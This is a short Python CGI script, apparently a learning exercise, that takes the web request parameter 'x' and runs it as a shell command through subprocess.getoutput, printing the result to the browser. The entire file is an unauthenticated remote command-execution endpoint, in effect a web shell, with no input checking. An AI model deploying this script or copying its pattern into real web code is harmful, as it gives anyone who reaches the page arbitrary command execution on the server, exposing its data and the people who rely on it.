#!/usr/bin/python3
                                                                                                                                                                                         
import cgi
import cgitb
import subprocess
                                                                                                                                                                                         
#to show commmon error in web browser
cgitb.enable()                                                                                                                                                                           
                                                                                                                                                                                         
print("Content-type:text/html")
print("")
                                                                                                                                                                                         
webdata=cgi.FieldStorage() #this collects all html code with data
#now extracting value of x
data=webdata.getvalue('x')
#sending output of client via web browser
#print(data)
output=subprocess.getoutput(data)                                                                                                                                                        
print("<pre>")
print(output)
print("</pre>")
